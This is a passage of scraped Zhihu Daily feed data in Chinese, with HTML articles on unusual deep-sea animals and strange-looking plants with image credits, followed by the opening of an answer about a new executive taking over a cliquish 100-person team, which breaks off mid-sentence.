alt=\"\"><figcaption>吐“舌头”好可爱~</figcaption></figure><p>我们对该物种知之甚少，Ebersbach(1915 年)仔细剖析了他认为是烟灰蛸的标本后，Robson (1932) 建立了 Grimpoteuthis 属，随后烟灰蛸被确认(G.umbellata)(Fischer，1883 年)为在该属下的一个新物种（在 2003 年都被证明不是烟灰蛸）</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-686a78dde9ff21e11f16d85ef4115da2_b.jpg\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-2b670d5b44c0e33e9967d350977bcfc5_b.jpg\" alt=\"\"><figcaption>图片来源 http://www.10tons.dk/grimpoteuthis-umbellata</figcaption></figure><p>Grimpoteuthis 身体两侧都有大耳朵一样的“鳍”，它们的“鳍”每秒可扇动 4～30 下，在不借助从体管喷出水流的情况下，也能自由游动。这让人想起它们与迪斯尼动画中的“小飞象”很相似，所以通常被称为小飞象章鱼。它们眼睛附近的透明“斑块”能帮助探测到微弱的、难以聚焦的光线。（仅是目前猜测，还不清楚这些斑块的用途。）</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ec91f4f99f98b3af4d6b488f8ea69614_b.jpg\" alt=\"\"><figcaption>图片来源 http://tolweb.org/onlinecontributors/app;jsessionid=F1E601947D7491BA4943F6D7C753B806?page=ViewImageData&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;service=external&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;sp=5358</figcaption></figure><p>与其他章鱼不同的是它们不会喷出墨水作为防御手段。除此之外，它们还有“jio 毛”（须毛）作为深海中捕食的利器。</p>\n<ul><li><strong><em>Macropinna Microstoma（太平洋桶眼鱼）</em></strong></li></ul>\n<figure><img src=\"https://pic2.zhimg.com/v2-79b90c19cdbfb8990b80a621c4efdfcd_b.jpg\" alt=\"\"><figcaption>图片来源 http://ourmarinespecies.com/c-fishes/barreleye-fish/</figcaption></figure><p> <br><br>这是一个 2004 年才被拍摄到的物种。当它们发现小鱼和水母等猎物时，眼睛会像双筒望远镜一样旋转，而当它将身体从水平位置转向垂直位置觅食时，眼睛会向前看，因此被叫做“桶眼鱼”。MBARI 研究人员 Kim Reisenbichler 推测它们会从管水母那里偷取食物。而它的透明的头部则保护鱼的眼睛不受虹吸管刺细胞的伤害。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-b2a53c07fed2107f4f72b7a4c8cba91d_b.jpg\" alt=\"\"><figcaption>这种鱼的眼睛是位于头顶上的发绿色荧光的圆球，而在脸部的两个洞实际上是鼻孔。 图片来源 https://www.mbari.org/barreleye-fish-with-tubular-eyes-and-transparent-head/</figcaption></figure><p>虽然这种管状的眼睛非常善于收集光线，但它们的视野非常狭窄，到目前为止，大多数海洋生物学家认为桶眼鱼的眼睛是固定的，这将使他们只能向上看 - 不可能看到它们正前方的东西，也很难用它们又小又尖的嘴捕捉猎物。（偶尔会吃小水母）它眼睛里的绿色色素可以过滤掉来自海面的阳光，帮助发现头顶上的水母或其他动物发出的生物光。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-bda1ddba1d5efec1ea6bec431a6678f4_b.jpg\" alt=\"\"><figcaption>图片来源 https://animals.fandom.com/wiki/Macropinna_microstoma</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-03e3eab6d24bebb7498499e170192660_b.jpg\" alt=\"\"><figcaption>它们分布在北太平洋以及北冰洋的深海中，资料来源 https://www.fishbase.se/references/FBRefSummary.php?ID=96339</figcaption></figure><ul><li><strong><em> Chondrocladia lampadiglobus 乒乓球树海绵</em></strong></li></ul>\n<figure><img src=\"https://pic2.zhimg.com/v2-2a03c2a32f5b0a60fb4be8b3b968aef1_b.jpg\" alt=\"\"><figcaption>图片来源:https://www.fciencias.com/2015/03/06/chondrocladia-lampadiglobus-vida-em-destaque/</figcaption></figure><p>乒乓球树海绵(Chondrocladia lampadiglobus)是于 10 年左右在太平洋深海中发现的一种食肉海绵。蓝色斑点附着在细茎上，被称为针状体的结构所覆盖，这些针状体看起来像小钩子，小型海洋类动物被困在这里，然后被消化，再分布到海绵身体的其他部分;通过吞噬作用，一个细胞一个细胞地消化食物。（1993 年在其体内观察到深海生物的碎片，从而证实了它肉食性的进食习惯）</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-3585cc5541ff2b3d97ceabbb86696b45_b.gif\" alt=\"\"><figcaption>图片来源 https://academic.oup.com/zoolinnean/article/148/4/553/2630831</figcaption></figure><p> <br><br>它身长可达 50 厘米。这种特殊的海绵物种可以在 8860 英尺的深处仍保持生命活动。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-56106c90d194522041de6a57c0474135_b.jpg\" alt=\"\"><figcaption>图片来源 https://www.fciencias.com/2015/03/06/chondrocladia-lampadiglobus-vida-em-destaque/</figcaption></figure><figure><img src=\"https://pic4.zhimg.com/v2-32ab5f113721c5ef7b2360dba55a9bdb_b.jpeg\" alt=\"\"><figcaption>和原神里蒲公英一模一样 </figcaption></figure><p><strong><em>图片来源</em></strong></p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//factanimal.com/atretochoana/\" target=\"_blank\" rel=\"nofollow noreferrer\">Atretochoana (Penis Snake) Facts - Fact Animal</a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=https%3A//www.boredpanda.com/strange-unusual-animals/%3Futm_source%3Dcn.bing%26amp%3Butm_medium%3Dreferral%26amp%3Butm_campaign%3Dorganic\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://www.</span><span>boredpanda.com/strange-</span><span>unusual-animals/?utm_source=cn.bing&amp;utm_medium=referral&amp;utm_campaign=organic</span><span></span></a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=http%3A//tolweb.org/onlinecontributors/app%3Bjsessionid%3DF1E601947D7491BA4943F6D7C753B806%3Fpage%3DViewImageData%26service%3Dexternal%26sp%3D5358\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>tolweb.org/onlinecontri</span><span>butors/app;jsessionid=F1E601947D7491BA4943F6D7C753B806?page=ViewImageData&amp;service=external&amp;sp=5358</span><span></span></a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=https%3A//www.pbs.org/wnet/nature/blog/inside-nature-featured-creature-blue-dragon/\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://www.</span><span>pbs.org/wnet/nature/blo</span><span>g/inside-nature-featured-creature-blue-dragon/</span><span></span></a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=https%3A//animals.fandom.com/wiki/Macropinna_microstoma\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>animals.fandom.com/wiki</span><span>/Macropinna_microstoma</span><span></span></a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=https%3A//animals.fandom.com/wiki/Macropinna_microstoma\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>animals.fandom.com/wiki</span><span>/Macropinna_microstoma</span><span></span></a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=http%3A//www.10tons.dk/grimpoteuthis-umbellata\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://www.</span><span>10tons.dk/grimpoteuthis</span><span>-umbellata</span><span></span></a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=http%3A//ourmarinespecies.com/c-fishes/barreleye-fish/\" target=\"_blank\" rel=\"nofollow noreferrer\">Barreleye Fish: Characteristics, types, reproduction and more...</a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=https%3A//www.fciencias.com/2015/03/06/chondrocladia-lampadiglobus-vida-em-destaque/\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://www.</span><span>fciencias.com/2015/03/0</span><span>6/chondrocladia-lampadiglobus-vida-em-destaque/</span><span></span></a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=https%3A//nwf.org/Magazines/National-Wildlife/2018/Feb-Mar/Animals/Star-nosed-Mole\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>nwf.org/Magazines/Natio</span><span>nal-Wildlife/2018/Feb-Mar/Animals/Star-nosed-Mole</span><span></span></a><br><br><strong><em>参考</em></strong></p>\n<ul>\n<li><a href=\"https://link.zhihu.com/?target=https%3A//nwf.org/Magazines/National-Wildlife/2018/Feb-Mar/Animals/Star-nosed-Mole\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>nwf.org/Magazines/Natio</span><span>nal-Wildlife/2018/Feb-Mar/Animals/Star-nosed-Mole</span><span></span></a></li>\n<li><a href=\"https://link.zhihu.com/?target=https%3A//allthatsinteresting.com/glaucus-atlanticus-blug-dragon-sea-slug\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>allthatsinteresting.com</span><span>/glaucus-atlanticus-blug-dragon-sea-slug</span><span></span></a></li>\n</ul>\n<blockquote>Glaucus atlanticusisn’t the bottom-feeding sea slug people are used to seeing. They use a gas sac in their stomachs to float upside-down in warm ocean currents, snagging other small venomous jellyfish with their tiny blue feet.</blockquote>\n<ul>\n<li><a href=\"https://link.zhihu.com/?target=https%3A//www.pbs.org/wnet/nature/blog/inside-nature-featured-creature-blue-dragon/\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://www.</span><span>pbs.org/wnet/nature/blo</span><span>g/inside-nature-featured-creature-blue-dragon/</span><span></span></a></li>\n<li><a href=\"https://link.zhihu.com/?target=http%3A//tolweb.org/Grimpoteuthis\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>tolweb.org/Grimpoteuthi</span><span>s</span><span></span></a></li>\n<li><a href=\"https://link.zhihu.com/?target=https%3A//www.gbif.org/species/2289266\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://www.</span><span>gbif.org/species/228926</span><span>6</span><span></span></a></li>\n<li><a href=\"https://link.zhihu.com/?target=https%3A//m.guokr.com/article/446144/\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>m.guokr.com/article/446</span><span>144/</span><span></span></a></li>\n<li><a href=\"https://link.zhihu.com/?target=https%3A//www.fishbase.se/summary/2704\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://www.</span><span>fishbase.se/summary/270</span><span>4</span><span></span></a></li>\n<li><a href=\"https://link.zhihu.com/?target=http%3A//ourmarinespecies.com/c-fishes/barreleye-fish/\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://</span><span>ourmarinespecies.com/c-</span><span>fishes/barreleye-fish/</span><span></span></a></li>\n<li><a href=\"https://link.zhihu.com/?target=https%3A//academic.oup.com/zoolinnean/article/148/4/553/2630831\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>academic.oup.com/zoolin</span><span>nean/article/148/4/553/2630831</span><span></span></a></li>\n<li>Figure-OXFORD UNIVERSITY PRESS.pptx</li>\n</ul>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//1drv.ms/p/s%21AvfvU5gDN-avgWiX7HtdxMsj76xK\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>1drv.ms/p/s!AvfvU5gDN-a</span><span>vgWiX7HtdxMsj76xK</span><span></span></a></p>\n<ul>\n<li><a href=\"https://link.zhihu.com/?target=https%3A//en.m.wikipedia.org/wiki/Macropinna_microstoma\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>en.m.wikipedia.org/wiki</span><span>/Macropinna_microstoma</span><span></span></a></li>\n<li><a href=\"https://link.zhihu.com/?target=https%3A//animals.fandom.com/wiki/Macropinna_microstoma\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>animals.fandom.com/wiki</span><span>/Macropinna_microstoma</span><span></span></a></li>\n<li><a href=\"https://link.zhihu.com/?target=https%3A//www.mbari.org/barreleye-fish-with-tubular-eyes-and-transparent-head/\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://www.</span><span>mbari.org/barreleye-fis</span><span>h-with-tubular-eyes-and-transparent-head/</span><span></span></a></li>\n</ul>\n<div><a href=\"https://zhuanlan.zhihu.com/p/350994002\">阅读原文</a></div>\n</div>\n</div>\n</div>","link":"https://daily.zhihu.com/story/9738254"},{"title":"物种真奇妙！——植物篇","date":"2021-07-19 23:07:12","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-b8f2e818b5e3c67819adadcea6069891_l.jpg?source=8673f162\"><span>熙寒，</span><span>知乎原教旨主义喵</span>\n</div>\n<div>\n<p>由于本篇植物有些没有中文译名，若各位读者有更好的译法，欢迎评论区讨论～</p>\n<hr>\n<ul><li><strong><em>Monkey Face Orchid (Dracula simia)（猴脸兰花）</em></strong></li></ul>\n<figure><img src=\"https://pic2.zhimg.com/v2-a02728547661ac97dd2c82c4ab607f19_b.jpg\" alt=\"\"><figcaption>图片来源 https://en.m.wikipedia.org/wiki/Dracula_simia</figcaption></figure><p> <br><br>这种兰花看起来有两只黑色的眼睛，上边点缀着眉毛，拥有凸起的小鼻子，甚至还有类似于猿猴脸上看到的胡子般的绒毛，因而被称为猴脸兰花。它的学名叫做“Dracula”，得名于从花朵上垂下来的看起来就像吸血鬼的尖牙的长长的马刺。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-a3564ae3f6f9386f9a7d50b683990b07_b.jpg\" alt=\"\"><figcaption>图片来源:https://www.flowerweb.com/en/article/170136/MEET-DRACULA-ORCHID-SIMIA-Orchid-Monkey</figcaption></figure><p>猴脸兰花是一种非常罕见的兰花——它生长在秘鲁和厄瓜多尔东南部 1600 至 2500 米的高山上。这种稀有植物具有全年开花的能力，它的花闻起来就像成熟的桔子。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-b220e07c55489d425328236759884699_b.jpg\" alt=\"\"><figcaption>图片来源 https://www.orchidsplus.com/monkey-orchid-facts/</figcaption></figure><ul><li><strong><em>Naked Man Orchid (Orchis italica)（赤裸男兰花&amp;曼兰&amp;意大利兰花）</em></strong></li></ul>\n<figure><img src=\"https://pic1.zhimg.com/v2-9f18df01492d3ecc28d84c4f8194f0c8_b.jpg\" alt=\"\"><figcaption>一朵赤裸兰花，图片来源 https://www.orchidsplus.com/facts-about-the-hanging-naked-man-orchid/</figcaption></figure><p>曼兰原产于地中海地区，</p>\n<p>这种兰花的花瓣像一个男人的形状（因为它有小 jj），因此被称为“赤裸男兰花”。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-aef012a808869c9763ce6f459faf9436_b.jpg\" alt=\"\"><figcaption>图片来源 https://earthlymission.com/strangest-flowers-orchids-world-resemble-look-like-something-else/</figcaption></figure><p>由于它与男性生殖器官的相似性，在罗马帝国时代，这种兰花还被用来治疗男性阳痿问题。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-bfc05663969b7a43a30c1431de190c18_b.jpg\" alt=\"\"><figcaption>图片来源 https://www.gardentags.com/plant-encyclopedia/orchis-italica/4136</figcaption></figure><ul><li><strong><em>Snap Dragon Seed Pod (Antirrhinum majus)（龙种荚(金鱼草)）</em></strong></li></ul>\n<figure><img src=\"https://pic1.zhimg.com/v2-98c9262692526c54bf7d76926d857924_b.jpg\" alt=\"\"><figcaption>图片来源 https://www.trendsnhealth.com/25-rare-and-weird-flowers-that-look-like-something-else/5/</figcaption></figure><p> <br><br>在（欧洲）古代，人们相信金鱼草有着神秘的力量，通过在花园里种植它们，可以逃离邪恶的诅咒。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-047ad89e2e440845f7e583f6833db23a_b.jpg\" alt=\"\"><figcaption>图片来源 https://davesgarden.com/guides/pf/showimage/76040/#gallery-carousel</figcaption></figure><ul><li><strong><em>White Egret Orchid(Pecteilis radiata)（白鹭兰）</em></strong></li></ul>\n<figure><img src=\"https://pic4.zhimg.com/v2-9755d64a1cbb1684e8fa391088819627_b.jpg\" alt=\"\"></figure><p> <br><br>花如其名，白鹭兰盛开时如同一群群白鹭欲翅高飞的模样，它的飞鸟状花朵沿着一个穗状花序生长，一个穗状花序可以开出十朵单花，长的甚至可以长到十六英寸（约 30.48cm）高！</p>\n<ul><li><strong><em>Hammer Orchid</em>（蜂锤兰）</strong></li></ul>\n<figure><img src=\"https://pic2.zhimg.com/v2-03b1a0c53aa583994214d92db5f67f49_b.jpg\" alt=\"\"><figcaption>当然一些找不到配偶的雄峰会将蜂锤兰当玩具发泄</figcaption></figure><p>这种来自西澳大利亚的濒危兰花物种，学名为 Drakaea glyptodon。它会模仿雌蜂的身体并且发出雌蜂的气味让雄蜂试图与假的雌蜂共舞，在雄峰与蜂锤兰完成“爱的过程”后便完成授粉任务。而要完成一种植物的授粉，一只雄峰必须与另一株蜂锤兰接触并“交配”。所以，这只可怜的傻瓜蛋必须被蜂锤兰以同样方式愚弄两次。</p>\n<ul><li><strong><em>Gympie —gympie （金皮树）</em></strong></li></ul>\n<figure><img src=\"https://pic2.zhimg.com/v2-2311f31213cbb918a65b52e66a6e8001_b.jpg\" alt=\"\"><figcaption>图片来源 https://www.elitereaders.com/weirdest-plants-on-earth/</figcaption></figure><p>盛产于澳大利亚东北部、摩鹿加群岛和印度尼西亚的金皮树被公认为为世界最毒树之一。金皮树表面上看起来无毒无害，实际上危险万分。其毒性可毒死一匹健壮的马。对于护林人、勘测员和伐木工来说，金皮树是个潜在的致命威胁。即使未被毒死这份中毒后的疼痛可能会伴随你几年。</p>\n<ul><li><strong><em>Hydnora africana（非洲白鹭花）</em></strong></li></ul>\n<figure><img src=\"https://pic4.zhimg.com/v2-28236baf980c5e4c24f9f8f4ef326ebf_b.jpg\" alt=\"\"></figure><p>1774 年，南非植物学之父卡尔·森伯格看到了这株奇怪的植物，误认为是一种真菌，因此将其命名为 Hydnora（类似真菌的）africana（指在非洲发现的）。这种植株在开花时会放出腐臭味引诱甲虫前来，帮其完成授粉。授粉完成后，它的果实便在土壤中“蛰伏”两年直至果实成熟。由于它的果实富含淀粉，因此在贫瘠的沙漠中，它也是一份难得的“美食”。</p>\n<ul><li><strong><em>Monotropa uniflora （水晶兰）</em></strong></li></ul>\n<figure><img src=\"https://pic4.zhimg.com/v2-648e07281c133e21ce63b32a4087ed2f_b.jpg\" alt=\"\"><figcaption>图片来源 http://www.easttennesseewildflowers.com/gallery3/index.php/Fall-Woodland-Pink/Indianpipes_pink_PSP0001</figcaption></figure><p> <br><br>这是一种腐生植物，同其他腐生植物一样，这种植株内并不含叶绿素（不能进行光合作用），也不能自己制造有机养分，只能通过与某种真菌的共生关系从附近的树木或腐草获取养分（菌根植物）。因为这种共生关系，加之它冷白的花朵，所以有人又叫它“ghost plant（鬼株）&amp;corpse plant（尸株）”水晶兰的种子小如粉尘，几乎没有营养供它继续发育，为了解决这个问题，与其共生的的真菌还充当了“保姆”的职务，促进种子的萌发并在发育过程中提供营养，科学上称为“真菌诱导”（Fungal-induced）。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-c6c9cd4226508df50096a6e378efc0fe_b.jpg\" alt=\"\"><figcaption>图片来源 http://www.thegorgeousdaily.com/monotropa-uniflora/</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-f97267df7aa1c1118acfbfbf82b2dbc1_b.jpg\" alt=\"\"><figcaption>图片来源 https://michiganflora.net/species.aspx?id=1223</figcaption></figure><ul><li><strong><em> The Darth Vader Flower（黑武士马兜铃）</em></strong></li></ul>\n<figure><img src=\"https://pic1.zhimg.com/v2-a8e1d9334a769a6a839ea78f7622eda4_b.jpg\" alt=\"\"><figcaption>图片来源 https://blog.flowersacrosssydney.com.au/flowers-that-dont-look-like-flowers/</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-c6b376a17cf0bf4daa0336f1ac36ada1_b.jpg\" alt=\"\"><figcaption>因酷似黑武士而得名</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-49d5234d2b9450834f5d3624f002f0b8_b.jpg\" alt=\"\"><figcaption>花上有小而浓密的毛刺，增加授粉成功的几率；图片来源 https://fairchildgarden.org/miami-botanical-garden/flower-gardens/august/</figcaption></figure><p>这种植物的花朵有这酷似“黑武士”的外表，白色的“眼睛”配以腐臭的“香味”绝对是引诱昆虫前来传粉的最大“杀器”。这种花稍纵即逝——花期仅有一个星期。</p>\n<hr>\n<p><strong><em>图片来源</em></strong></p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//en.m.wikipedia.org/wiki/Dracula_simia\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>en.m.wikipedia.org/wiki</span><span>/Dracula_simia</span><span></span></a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=https%3A//www.flowerweb.com/en/article/170136/MEET-DRACULA-ORCHID-SIMIA-Orchid-Monkey\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://www.</span><span>flowerweb.com/en/articl</span><span>e/170136/MEET-DRACULA-ORCHID-SIMIA-Orchid-Monkey</span><span></span></a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=https%3A//www.orchidsplus.com/monkey-orchid-facts/\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://www.</span><span>orchidsplus.com/monkey-</span><span>orchid-facts/</span><span></span></a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=https%3A//www.orchidsplus.com/facts-about-the-hanging-naked-man-orchid/\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://www.</span><span>orchidsplus.com/facts-a</span><span>bout-the-hanging-naked-man-orchid/</span><span></span></a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=https%3A//www.gardentags.com/plant-encyclopedia/orchis-italica/4136\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://www.</span><span>gardentags.com/plant-en</span><span>cyclopedia/orchis-italica/4136</span><span></span></a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=http%3A//www.huffingtonpost.jp/2013/12/17/darth-vader-flower_n_4463608.html\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://www.</span><span>huffingtonpost.jp/2013/</span><span>12/17/darth-vader-flower_n_4463608.html</span><span></span></a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=https%3A//davesgarden.com/guides/pf/showimage/76040/%23gallery-carousel\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>davesgarden.com/guides/</span><span>pf/showimage/76040/#gallery-carousel</span><span></span></a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=https%3A//earthlymission.com/strangest-flowers-orchids-world-resemble-look-like-something-else/\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>earthlymission.com/stra</span><span>ngest-flowers-orchids-world-resemble-look-like-something-else/</span><span></span></a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=http%3A//www.easttennesseewildflowers.com/gallery3/index.php/Fall-Woodland-Pink/Indianpipes_pink_PSP0001\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://www.</span><span>easttennesseewildflowers.com</span><span>/gallery3/index.php/Fall-Woodland-Pink/Indianpipes_pink_PSP0001</span><span></span></a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=https%3A//freaked.com/aristolochia-salvadorensis-the-darth-vader-flower/\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>freaked.com/aristolochi</span><span>a-salvadorensis-the-darth-vader-flower/</span><span></span></a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=https%3A//www.elitereaders.com/weirdest-plants-on-earth/\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://www.</span><span>elitereaders.com/weirde</span><span>st-plants-on-earth/</span><span></span></a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=http%3A//www.thegorgeousdaily.com/monotropa-uniflora/\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>http://www.</span><span>thegorgeousdaily.com/mo</span><span>notropa-uniflora/</span><span></span></a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=https%3A//michiganflora.net/species.aspx%3Fid%3D1223\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>michiganflora.net/speci</span><span>es.aspx?id=1223</span><span></span></a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=https%3A//blog.flowersacrosssydney.com.au/flowers-that-dont-look-like-flowers/\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>blog.flowersacrosssydney.com.au</span><span>/flowers-that-dont-look-like-flowers/</span><span></span></a></p>\n<hr>\n<p><strong><em>参考</em></strong></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=https%3A//www.orchidsplus.com/monkey-orchid-facts/\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://www.</span><span>orchidsplus.com/monkey-</span><span>orchid-facts/</span><span></span></a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=https%3A//www.gardentags.com/plant-encyclopedia/orchis-italica/4136\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://www.</span><span>gardentags.com/plant-en</span><span>cyclopedia/orchis-italica/4136</span><span></span></a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=https%3A//zhidao.baidu.com/question/199897969884965245.html\" target=\"_blank\" rel=\"nofollow noreferrer\">gympie-gympie 是什么植物</a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=http%3A//pza.sanbi.org/hydnora-africana\" target=\"_blank\" rel=\"nofollow noreferrer\">Hydnora africana</a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=https%3A//www.dailymail.co.uk/travel/travel_news/article-7157679/The-worlds-strangest-plants-flowers-them.html\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://www.</span><span>dailymail.co.uk/travel/</span><span>travel_news/article-7157679/The-worlds-strangest-plants-flowers-them.html</span><span></span></a></p>\n<p> <br><br><a href=\"https://link.zhihu.com/?target=https%3A//depts.washington.edu/propplnt/Plants/monotropa%2520uniflora.htm\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>depts.washington.edu/pr</span><span>opplnt/Plants/monotropa%20uniflora.htm</span><span></span></a><br><br>[1]宁文 曹日强.真菌诱导物在植物次生代谢中的调节作用 [J]植物生理学通讯 CSCD 1993（5）321-329<br><br>[2]Mathews, D. (1990).Cascade-Olympic Natural History. Raven Editions.</p>\n<div><a href=\"https://zhuanlan.zhihu.com/p/351295575\">阅读原文</a></div>\n</div>\n</div>\n</div>","link":"https://daily.zhihu.com/story/9738258"},{"title":"如果你作为高管空降某部门，团队乌烟瘴气，抱团严重。怎么办？","date":"2021-07-19 23:07:08","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-f1ec2f5f029204a750b38c74a25ccce5_l.jpg?source=8673f162\"><span>空白白白白，</span><span>可以去公众号：空白女侠 认识我。不接商业广告/付费咨询</span>\n<a href=\"https://www.zhihu.com/question/472664105/answer/2003842348\" hidden>阅读原文</a>\n</div>\n<div>\n<p>我自认为在职场中空降领导是非常艰难的，更不要提还是空降到一个“乌烟瘴气”的团队。要知道领导是需要靠团队支撑拿结果的，如果团队不靠谱，领导就如无源之水，无本之木，不要说拿结果了，很可能连职位都保不住。网传阿里 P9 空降成活率不超过 40%，我觉得应该是真的。事实上，现实世界中也有不少大佬由于搞不定下属团队而最终无奈离开。</p>\n<p>像题主说的这种场景，其实最简单的方式就是“灌水”。<strong>所谓“灌水”指领导空降后，大量引入“自己人”，把团队里的老人都边缘化，最终替换掉。</strong>这种方法简单通用，也是很多空降大佬的首选，很多公司内的平安系、百度系、招行系等等都是这么来的。但一方面大量引入“自己人”成本不小，另一方面如此多的人员调度也会引起 HR 的意见，因此并不是所有场合都适用。</p>\n<p>今天我和大家讲一个真实的故事，一个依靠个人魅力，依靠一己之力快速把团队掌控于手，最终将团队拖出泥潭的故事，我作为全程旁观者大受震撼。</p>\n<p><strong>我觉得这个过程是教科书级别！</strong></p>\n<p>故事的主人公就是我的前领导，当时他被 CTO 指派接手一个 100 多人的移动团队。这个团队的前老大是公司技术副总经理，因为和公司闹的不太愉快而愤然离职。这个团队在前老大的带领下非常抱团，整个团队对前老大的离开愤愤不平，仿佛一个炸药包一样，一粒火星就会引发大爆炸。在找我领导之前，CTO 也找了好几个技术老板，但大家都推脱了。说句实话，对于我老板去接手这个团队我是非常不理解的，也并不看好他能全身而退。然而，他后续一系列的操作也真的深深的震撼了我。</p>\n<p>首先，他先把团队人员拉了一张清单，排除比较边缘的人员（比如入职不久的校招生，初级开发等），圈出其中的 KP（<strong>KP：Key Person</strong>，对团队运转较为关键的人，比如小组长，资深研发等）。然后找到和这些人经常接触的周边团队做了一番了解（比如产品、HRBP 等）。了解内容主要是这些人的个人背景，还有这些人日常的工作表现，哪些人是前领导的死忠，哪些人跟刺头们貌合神离其实是中立的。以及这些人员彼此之间的关系等。</p>\n<p>基于掌握的信息，我领导展开了一场持久的 One on One（1 对 1 的面对面沟通）。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-bc3dd5855c8a3e77a22e249652c641b3_720w.jpg?source=8673f162\" alt=\"\"></figure><p>（这张图很绝，我一直以为是人员沟通是随机聊的，没想到专门做出了沟通的顺序表，后面你就知道为什么）</p>\n<p>第一步，他先找到比较中立的 KP，主要了解这些人对团队现状的看法，对自己未来发展的期望，进一步补充完善对团队内 KP 的信息。同时他会重点介绍自己对未来团队的发展规划并表达对这些人的信任和期望，鼓励大家与团队一起成长。在和中立 KP 沟通完成后，<strong>他已大体上了解了团队的整体情况，也有了与刺头 KP 沟通的底牌。</strong></p>\n<p>第二步，他展开与刺头 KP 的沟通。在这个沟通中，他重点判断的是刺头 KP 对团队的重要性。对于当前还非常重要的刺头 KP，他重点安抚，保证团队的战力。对于可以替代的刺头 KP，他则明确给出管理要求，要求限期达成。我印象里，这次谈话持续了近 3 天，每次谈话大约 1 